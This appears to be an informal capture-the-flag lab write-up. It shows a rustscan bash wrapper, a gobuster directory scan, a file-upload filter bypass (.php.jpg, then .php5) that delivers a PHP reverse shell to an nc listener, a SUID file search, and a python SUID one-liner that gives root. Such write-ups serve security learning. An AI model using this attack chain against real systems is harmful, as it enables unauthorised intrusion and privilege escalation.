so first i sartred by port scanning by rustscan i just made a script for or just to practice some of new bash sscritpting i have learned


<code>#!/bin/bash
echo "Name the file you want to save the scan result : "
read name
echo "Enter the ip address"
read ip
echo "[+] Reading ip adress"
sleep 3
echo "[+] Started scanning"


rustscan -a $ip > $name
echo "[+] Scan Completed"
echo "[+]Fetching ip addresses and port"
cat $name | grep -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]\.[0-9]{1,3} </code>



and found 2 ports open

Open 10.10.8.25:22
Open 10.10.8.25:80

started gobuster scan 

gobuster dir -u http://10.10.8.25 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x txt,php,html -t 100

uploads              (Status: 301) [Size: 310] [--> http://10.10.8.25/uploads/]
/index.php            (Status: 200) [Size: 616]

/panel                (Status: 301) [Size: 308] [--> http://10.10.8.25/panel/] 

found two intresting directories /uploads and /panel
in panel we have something to upload

i tried uploading file with .php extention but it showed some error!
after that i tried changing php file with .php.jpg extention and it got uploaded


i changed my directory to /uploads there i saw my file after that i starterd my nc listeneer on the port i mentioned in the exploit

after that i waitedd for the rev shell but i didnt got any thing 

from this i have learned if if get error something like

cannot be displayed because it contains error! probably it could be because of exxtention
"The image “http://10.10.100.244/uploads/php-reverse-shell.php.jpg” cannot be displayed because it contains errors."

and "WARNING: Failed to daemonise. This is quite common and not fatal. Connection refused (111) " this is for not starting the rev connection listener on the terminal
.


then i though of changing the file extention to any another i tried with other versions of php that is php5 or php3 i got shell for php5  but in php3 i got error again

i got the shell


after that i searched for suid  files as most of the boxes are vuln to that only

find / -type f -perm -u=s 2>/dev/null

i got a python binary with suid bit set just google about the python suid on the fav website gtfobins


python -c 'import os; os.execl("/bin/sh", "sh", "-p")'



ran this command and got the root user : cheers
